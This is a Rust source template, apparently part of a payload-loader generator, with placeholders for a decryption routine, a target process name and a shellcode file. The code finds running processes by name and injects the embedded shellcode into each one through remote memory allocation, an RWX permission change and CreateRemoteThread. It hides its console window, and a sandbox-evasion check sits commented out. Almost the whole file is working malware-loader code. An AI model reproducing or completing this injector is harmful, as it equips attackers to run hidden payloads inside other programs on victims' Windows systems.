#![windows_subsystem = "windows"]
#[allow(non_snake_case)]

use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::VirtualAllocEx;
use windows::Win32::System::Memory::VirtualProtectEx;
use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use windows::Win32::System::Threading::CreateRemoteThread;
use windows::Win32::System::Threading::OpenProcess;
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
//use windows::Win32::System::SystemInformation::GetPhysicallyInstalledSystemMemory;
use std::include_bytes;
{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn boxboxbox(tar: &str) -> Vec<usize> {
    // search for processes to inject into
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        //println!("{} {}", pro.pid(), pro.name());
        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
    }
    return dom;
}

fn enhance(buf: Vec<u8>, tar: usize) {
    // injecting in target processes :)

    unsafe {
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, tar as u32).unwrap();
        let result_ptr = VirtualAllocEx(h_process, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
        let mut byteswritten = 0;
        let _resb = WriteProcessMemory(
            h_process,
            result_ptr,
            buf.as_ptr() as _,
            buf.len(),
            Some(&mut byteswritten),
        );
        let mut old_perms = PAGE_EXECUTE_READWRITE;
        let _bool = VirtualProtectEx(
            h_process,
            result_ptr,
            buf.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_perms,
        );
        let _res_crt = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(std::mem::transmute(result_ptr)),
            None,
            0,
            None,
        )
        .unwrap();
    }
}

fn main() {
    // inject in the following processes:
    let tar: &str = "{{TARGET_PROCESS}}";

    // Removing the sandobox check for now, as it fails on numerous Windows versions.
    /*
    let mut memory = 0;
    unsafe {
        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
        println!("{:#?}", is_quicksand);
        if is_quicksand != 1 {
            panic!("Hello.")
        }
    }
    */

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let list: Vec<usize> = boxboxbox(tar);
    if list.len() == 0 {
        panic!("[-] Unable to find a process.")
    } else {
        for i in &list {
            {{MAIN}}
            enhance(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}
